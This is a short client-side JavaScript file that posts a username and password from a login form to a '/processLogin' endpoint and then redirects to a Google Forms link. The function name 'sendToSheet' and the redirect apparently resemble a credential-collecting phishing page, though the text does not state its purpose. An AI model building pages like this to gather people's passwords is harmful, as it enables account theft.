// public/script.js
function sendToSheet() {
  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;

  if (!username || !password) {
    alert('入力してください');
    return;
  }

  // フォームデータをサーバーに送信
  fetch('/processLogin', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
  })
  .then(response => response.json())
  .then(data => {
    if (data.status === 'Success') {
      // 送信成功後に、指定のURLにリダイレクト
      window.location.href = "https://forms.gle/Ufr5udqzD6pa9vAz6";
    } else {
      alert('エラー: ' + data.message);
    }
  })
  .catch(err => {
    alert('エラー: ' + err.message);
  });
}